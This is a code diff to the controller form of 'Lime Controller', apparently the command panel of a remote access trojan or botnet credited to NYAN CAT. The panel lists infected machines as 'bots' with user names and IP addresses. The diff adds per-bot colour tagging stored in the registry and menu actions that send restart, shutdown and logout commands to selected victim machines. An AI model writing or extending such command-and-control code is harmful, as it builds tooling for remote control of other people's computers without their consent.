@@ -44,6 +44,7 @@ Public Class Form1
     Public Shared MYPORT As Integer
 
 
+
 #Region "Form Events"
 
 
@@ -106,8 +107,14 @@ Public Class Form1
                         For i As Integer = 2 To A.Length - 1
                             u.L.SubItems.Add(A(i))
                         Next
+
+                        If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", u.L.SubItems(0).Text, Nothing) IsNot Nothing Then
+                            u.L.ForeColor = ColorTranslator.FromHtml(My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", u.L.SubItems(0).Text, Nothing))
+                        End If
+
                         Fix()
                     End SyncLock
+
 
                     NotifyIcon1.BalloonTipIcon = ToolTipIcon.None
                     NotifyIcon1.BalloonTipText = "User: " + A(2) + vbNewLine + "IP: " + u.IP
@@ -250,7 +257,7 @@ Public Class Form1
 
     Private Sub L2_Click(sender As Object, e As EventArgs) Handles L2.Click
         L2.ClearSelected()
-        ChTabcontrol1.Focus()
+        MAIN_TAB.Focus()
     End Sub
 #End Region
 
@@ -492,6 +499,38 @@ Public Class Form1
 
     Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
         MsgBox("Coded by NYAN CAT" + vbNewLine + vbNewLine + "r3vo@protonmail.com" + vbNewLine, MsgBoxStyle.Information, Title:=" Lime Controller | About ")
+    End Sub
+
+    Private Sub BotColorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BotColorToolStripMenuItem.Click
+        Dim cDialog As New ColorDialog
+
+        If (cDialog.ShowDialog() = DialogResult.OK) Then
+            For Each x As ListViewItem In L1.SelectedItems
+                x.ForeColor = cDialog.Color
+                Dim CCC = ColorTranslator.ToHtml(cDialog.Color)
+                My.Computer.Registry.CurrentUser.CreateSubKey("Software\Lime")
+                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", x.SubItems(0).Text, CCC)
+            Next
+        End If
+    End Sub
+
+
+    Private Sub PCRestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCRestartToolStripMenuItem.Click
+        For Each x As ListViewItem In L1.SelectedItems
+            S.Send(x.Tag, "PC-RES")
+        Next
+    End Sub
+
+    Private Sub PCShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCShutdownToolStripMenuItem.Click
+        For Each x As ListViewItem In L1.SelectedItems
+            S.Send(x.Tag, "PC-SHUT")
+        Next
+    End Sub
+
+    Private Sub PCLogoutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCLogoutToolStripMenuItem.Click
+        For Each x As ListViewItem In L1.SelectedItems
+            S.Send(x.Tag, "PC-OUT")
+        Next
     End Sub
 
 
